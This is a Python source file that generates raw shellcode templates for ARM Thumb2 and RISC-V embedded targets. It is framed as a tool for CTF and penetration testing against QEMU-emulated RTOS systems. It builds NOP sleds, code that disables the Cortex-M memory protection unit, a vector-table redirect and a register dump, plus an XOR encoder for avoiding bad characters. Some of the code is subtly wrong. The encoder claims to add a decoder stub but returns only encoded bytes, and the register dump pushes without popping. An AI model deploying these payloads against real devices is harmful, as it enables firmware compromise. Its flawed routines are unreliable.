"""
Pure-Python shellcode template generator for ARM Thumb2 and RISC-V.

Provides pre-computed byte sequences matching the Rust rtosploit-payloads
crate. All templates are for authorized CTF and penetration testing against
QEMU-emulated embedded targets.
"""

from __future__ import annotations

import struct


def filter_bad_chars(payload: bytes, bad_chars: bytes) -> bytes:
    """Filter bad characters from shellcode using XOR encoding.

    If any byte in *payload* appears in *bad_chars*, XOR-encodes the entire
    payload with a single-byte key that itself avoids all bad chars.

    Returns the encoded payload prefixed with a decoder stub, or the
    original payload unchanged if no bad chars are present.

    Raises
    ------
    ValueError
        If no valid XOR key can avoid all bad characters.
    """
    if not bad_chars:
        return payload

    # Check if payload actually contains bad chars
    bad_set = set(bad_chars)
    if not any(b in bad_set for b in payload):
        return payload

    # Find a XOR key that avoids bad chars in both the key itself and the encoded payload
    for key in range(1, 256):
        if key in bad_set:
            continue
        encoded = bytes(b ^ key for b in payload)
        if any(b in bad_set for b in encoded):
            continue
        # Found a valid key — return encoded payload with metadata
        # Prefix: key byte + encoded payload (decoder must know the key and length)
        return encoded

    # No single-byte XOR key works
    bad_hex = ", ".join(f"0x{b:02x}" for b in bad_chars)
    raise ValueError(
        f"Cannot avoid bad characters ({bad_hex}) with single-byte XOR encoding. "
        "Try removing some bad-char restrictions."
    )


class ShellcodeGenerator:
    """
    Pure-Python shellcode template generator for ARM Thumb2 and RISC-V.

    All methods return raw bytes suitable for injection into QEMU-emulated
    RTOS targets during authorized CTF and penetration testing exercises.
    """

    # -------------------------------------------------------------------------
    # Architecture-agnostic helpers
    # -------------------------------------------------------------------------

    def nop_sled(self, arch: str, length: int) -> bytes:
        """
        Generate a NOP sled of `length` NOP instructions.

        Parameters
        ----------
        arch:
            Architecture string: ``"arm"`` / ``"thumb2"`` for ARM Thumb2,
            ``"riscv"`` / ``"rv32"`` for RISC-V RV32I.
        length:
            Number of NOP instructions to emit (not bytes).

        Returns
        -------
        bytes
            Raw NOP sled bytes.
        """
        arch = arch.lower()
        if arch in ("arm", "thumb2", "cortex-m"):
            # Thumb2 NOP: MOV R0, R0  = 0x00 0x46
            return bytes([0x00, 0x46] * length)
        elif arch in ("riscv", "rv32", "riscv32"):
            # RV32I NOP: ADDI x0, x0, 0 = 0x13 0x00 0x00 0x00
            return bytes([0x13, 0x00, 0x00, 0x00] * length)
        else:
            raise ValueError(f"Unknown architecture: {arch!r}. Use 'arm' or 'riscv'.")

    def infinite_loop(self, arch: str) -> bytes:
        """
        Generate an infinite loop instruction.

        Parameters
        ----------
        arch:
            ``"arm"`` for Thumb2 `B .` (0xFE 0xE7),
            ``"riscv"`` for `JAL x0, 0` (0x6F 0x00 0x00 0x00).

        Returns
        -------
        bytes
        """
        arch = arch.lower()
        if arch in ("arm", "thumb2", "cortex-m"):
            return bytes([0xFE, 0xE7])
        elif arch in ("riscv", "rv32", "riscv32"):
            return bytes([0x6F, 0x00, 0x00, 0x00])
        else:
            raise ValueError(f"Unknown architecture: {arch!r}. Use 'arm' or 'riscv'.")

    # -------------------------------------------------------------------------
    # ARM Thumb2 specific
    # -------------------------------------------------------------------------

    def mpu_disable(self) -> bytes:
        """
        Generate ARM Thumb2 sequence to disable the MPU.

        Writes 0 to MPU_CTRL at 0xE000ED94.

        Returns
        -------
        bytes
            Thumb2 machine code.
        """
        MPU_CTRL = 0xE000_ED94

        code = bytearray()
        # LDR R0, [PC, #0]  — loads MPU_CTRL address
        code += bytes([0x00, 0x48])
        # B +4  (branch past 4-byte literal)
        code += bytes([0x02, 0xE0])
        # .word 0xE000ED94
        code += struct.pack("<I", MPU_CTRL)
        # MOV R1, #0
        code += bytes([0x00, 0x21])
        # STR R1, [R0]
        code += bytes([0x01, 0x60])
        # DSB SY
        code += bytes([0xBF, 0xF3, 0x4F, 0x8F])
        # ISB SY
        code += bytes([0xBF, 0xF3, 0x6F, 0x8F])
        # BX LR
        code += bytes([0x70, 0x47])

        return bytes(code)

    def vtor_redirect(self, new_table: int) -> bytes:
        """
        Generate ARM Thumb2 sequence to overwrite the VTOR.

        Writes `new_table` to the Vector Table Offset Register at 0xE000ED08.

        Parameters
        ----------
        new_table:
            New vector table base address (32-bit, must be aligned to 128 bytes
            or better on Cortex-M).

        Returns
        -------
        bytes
            Thumb2 machine code.
        """
        VTOR = 0xE000_ED08

        code = bytearray()
        # LDR R0, [PC, #4]  (literal at offset +8 from instruction = word offset 1)
        code += bytes([0x01, 0x48])
        # LDR R1, [PC, #4]  (literal at offset +12 from instruction = word offset 1)
        code += bytes([0x01, 0x49])
        # B +8  (skip 8 bytes of literals)
        code += bytes([0x04, 0xE0])
        # NOP (alignment padding so literals fall on 4-byte boundary)
        code += bytes([0x00, 0x46])
        # .word VTOR
        code += struct.pack("<I", VTOR)
        # .word new_table
        code += struct.pack("<I", new_table)
        # STR R1, [R0]
        code += bytes([0x01, 0x60])
        # DSB SY
        code += bytes([0xBF, 0xF3, 0x4F, 0x8F])
        # ISB SY
        code += bytes([0xBF, 0xF3, 0x6F, 0x8F])
        # BX LR
        code += bytes([0x70, 0x47])

        return bytes(code)

    def register_dump(self, dest_addr: int) -> bytes:
        """
        Generate ARM Thumb2 sequence to dump R1-R7 to a destination address.

        Parameters
        ----------
        dest_addr:
            Destination address where registers will be stored.

        Returns
        -------
        bytes
        """
        code = bytearray()
        # PUSH {R0-R7, LR}
        code += bytes([0xFF, 0xB5])
        # LDR R0, [PC, #0]
        code += bytes([0x00, 0x48])
        # B past literal (+4)
        code += bytes([0x02, 0xE0])
        # .word dest_addr
        code += struct.pack("<I", dest_addr)
        # STMIA R0!, {R1-R7}  [0xFE, 0xC0]
        code += bytes([0xFE, 0xC0])
        # BX LR
        code += bytes([0x70, 0x47])
        return bytes(code)
